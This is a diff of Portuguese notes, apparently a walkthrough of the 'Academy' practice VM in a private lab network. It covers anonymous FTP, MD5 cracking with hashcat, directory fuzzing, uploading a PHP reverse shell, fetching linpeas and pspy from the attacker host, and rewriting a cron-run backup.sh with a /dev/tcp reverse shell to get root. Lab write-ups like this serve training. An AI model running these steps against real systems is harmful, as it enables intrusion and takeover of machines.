@@ -1,20 +1,7 @@
-login: root
-passwd; tcm
-
+Alvo:
 Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 
-Walkthrough - Academy
-    #dhclient
-    ip a
-    uname -a
-    ------------
-    (kali)
-    ftp 192.168.57.7
-    Name: anonymous passwd:tcm
-    ftp> ls
-    ftp> get note.txt
-    ---------
-    nmap -A -p- -T4 192.168.57.7
+    #nmap -A -p- -T4 192.168.57.7
         Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 09:57 EDT
         Nmap scan report for 192.168.57.7
         Host is up (0.00068s latency).
@@ -59,45 +46,42 @@ Walkthrough - Academy
         OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
         Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 
-    ftp 192.168.57.7
+    #ftp 192.168.57.7
         Name: anonymous passwd:tcm
         ftp> ls
         ftp> get note.txt
 
-    cat note.txt
+    #cat note.txt                         (senha criptografada)
         cd73502828457d15655bbd7a63fb0bc8
-    hash-identifier
+    #hash-identifier
          HASH: cd73502828457d15655bbd7a63fb0bc8
 
             Possible Hashs:
             [+] MD5
             [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
 
-    pesquisar: hash crack md5 hash
+    - pesquisar: hash crack md5 hash
         https://www.4armed.com/blog/hashcat-crack-md5-hashes/
 
         O comando para iniciar nosso ataque de dicionário nos hashes é:
 
-        hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt
+        #hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt
 
-            -m 0 ->	Diz ao hashcat qual modo usar. 0 é MD5.
-            Hashes	-> Nosso arquivo contendo os nossos hashes de senha MD5.
 
-            /usr/share/wordlists/rockyou.txt ->	Aponta o hashcat para a lista de palavras que contém as senhas
-                                                     para hash e comparação.
+            /usr/share/wordlists/rockyou.txt 
 
-    locate rockyou.txt
+    #locate rockyou.txt            
 
         /usr/share/wordlists/rockyou.txt.gz
         gunzip rockyou.txt.gz
 
-    mousepad hashs.txt
+    #mousepad hashs.txt
         cd73502828457d15655bbd7a63fb0bc8
 
-    hashcat -m 0 hashs.txt /usr/share/wordlists/rockyou.txt
+    #hashcat -m 0 hashs.txt /usr/share/wordlists/rockyou.txt
         cd73502828457d15655bbd7a63fb0bc8:student
 
-    dirb http://192.168.57.7
+    #dirb http://192.168.57.7
         -----------------
         DIRB v2.22
         By The Dark Raver
@@ -122,7 +106,7 @@ Walkthrough - Academy
         END_TIME: Thu Sep  1 10:53:39 2022
         DOWNLOADED: 276720 - FOUND: 14
 
-    apt install ffuf
+    #apt install ffuf
         ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.7/FUZZ
 
             ________________________________________________
@@ -147,15 +131,15 @@ Walkthrough - Academy
             created by net/http.(*Transport).dialConn
                     net/http/transport.go:1751 +0x1791
 
-    pesquisar: php reverse shell
+    - pesquisar: php reverse shell
         https://github.com/pentestmonkey/php-reverse-shell
             copiar: php-reverse-shell.php
 
-    nano shell.php (trocar ip e port)
+    #nano shell.php (IP:192.168.57.5 PORT: 1234)
 
-    nc -nvlp 1234
+    #nc -nvlp 1234
 
-        entrar no site do IP/academy e na foto fazer o upload do arquivo shell.php
+        (conectar ao http://192.168.57.7/academy/ e fazer o Upload do shell.php no lugar de uma imagem.png)  
 
         connect to [192.168.57.5] from (UNKNOWN) [192.168.57.7] 60194
         Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
@@ -173,12 +157,9 @@ Walkthrough - Academy
 
 
     (entrou no sistema como usuário comum)
-        whoami
-        sudo -l
-        locate sudo
-        cd /tmp
+   
         --------------------------------
-        no kali
+        (kali)
 
         pesquisar: linpeas
             LinPEAS é um script que procura possíveis caminhos para escalar privilégios em hosts Linux/Unix*/MacOS.
@@ -186,10 +167,13 @@ Walkthrough - Academy
 
         https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
         copiar: linpeas_base.sh
-
+        
+        mkdir ~/transfer
+        cd transfer
         python3 -m http.server 80
+        colar:linpeas_base.sh
         -------------------------------------------------
-
+        (Linux Academy)
         wget http://192.168.57.5/linpeas.sh
         chmod +x linpeas.sh
         ./linpeas.sh
@@ -212,6 +196,7 @@ Walkthrough - Academy
     ssh grimmie@192.168.57.7
     passwd: My_V3ryS3cur3_P4ss
 
+        ssh grimmie@192.168.57.7
         grimmie@192.168.57.7's password:
         Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
@@ -227,37 +212,38 @@ Walkthrough - Academy
         grimmie@academy:~$
 
 
-    cd /home/grimmie/
-    ls
-    cat backup.sh
-        #!/bin/bash
+        cd /home/grimmie/
+        ls
+        cat backup.sh
+            #!/bin/bash
 
-        rm /tmp/backup.zip
-        zip -r /tmp/backup.zip /var/www/html/academy/includes
-        chmod 700 /tmp/backup.zip
+            rm /tmp/backup.zip
+            zip -r /tmp/backup.zip /var/www/html/academy/includes
+            chmod 700 /tmp/backup.zip
 
-    crontab -l
-    crontab -u root -l
-    crontab -e
-    systemctl list-timers
-        NEXT                         LEFT       LAST                         PASSED    UNIT                         AC
-        Fri 2022-09-02 11:39:00 EDT  24min left Fri 2022-09-02 11:09:01 EDT  5min ago  phpsessionclean.timer        ph
-        Sat 2022-09-03 00:00:00 EDT  12h left   Fri 2022-09-02 10:30:55 EDT  44min ago logrotate.timer              lo
-        Sat 2022-09-03 00:00:00 EDT  12h left   Fri 2022-09-02 10:30:55 EDT  44min ago man-db.timer                 ma
-        Sat 2022-09-03 01:42:41 EDT  14h left   Fri 2022-09-02 10:30:55 EDT  44min ago apt-daily.timer              ap
-        Sat 2022-09-03 06:36:35 EDT  19h left   Fri 2022-09-02 10:30:55 EDT  44min ago apt-daily-upgrade.timer      ap
-        Sat 2022-09-03 10:46:01 EDT  23h left   Fri 2022-09-02 10:46:01 EDT  28min ago systemd-tmpfiles-clean.timer sy
+        crontab -l
+        crontab -u root -l
+        crontab -e
+        systemctl list-timers
+            NEXT                         LEFT       LAST                         PASSED    UNIT                         AC
+            Fri 2022-09-02 11:39:00 EDT  24min left Fri 2022-09-02 11:09:01 EDT  5min ago  phpsessionclean.timer        ph
+            Sat 2022-09-03 00:00:00 EDT  12h left   Fri 2022-09-02 10:30:55 EDT  44min ago logrotate.timer              lo
+            Sat 2022-09-03 00:00:00 EDT  12h left   Fri 2022-09-02 10:30:55 EDT  44min ago man-db.timer                 ma
+            Sat 2022-09-03 01:42:41 EDT  14h left   Fri 2022-09-02 10:30:55 EDT  44min ago apt-daily.timer              ap
+            Sat 2022-09-03 06:36:35 EDT  19h left   Fri 2022-09-02 10:30:55 EDT  44min ago apt-daily-upgrade.timer      ap
+            Sat 2022-09-03 10:46:01 EDT  23h left   Fri 2022-09-02 10:46:01 EDT  28min ago systemd-tmpfiles-clean.timer sy
 
-        6 timers listed.
-        Pass --all to see loaded but inactive timers, too.
-    ps
-
+            6 timers listed.
+            Pass --all to see loaded but inactive timers, too.
+        ps
+    ---------------------------------------------------------------------
+    (Kali)
     pesquisar: pspy
         pspy é uma ferramenta de linha de comando projetada para bisbilhotar processos sem necessidade de
         permissões de root. Ele permite que você veja comandos executados por outros usuários, cron jobs, etc.
     https://github.com/DominicBreuker/pspy
         pspy64 download
-
+    
     cd /tpm
     wget http://192.168.57.5/pspy64
     chmod +x pspy
@@ -279,9 +265,10 @@ Walkthrough - Academy
         (apagar o conteúdo do script backup.sh e adicionar a seginte linha:)
 
         bash -i >& /dev/tcp/192.168.57.5/8081 0>&1
+        
         Algumas versões do bash podem enviar um shell reverso (isso foi testado no Ubuntu 10.10):
 
-    no kali
+    (kali)
     nc -nvlp 8081
 
      ./backup.sh
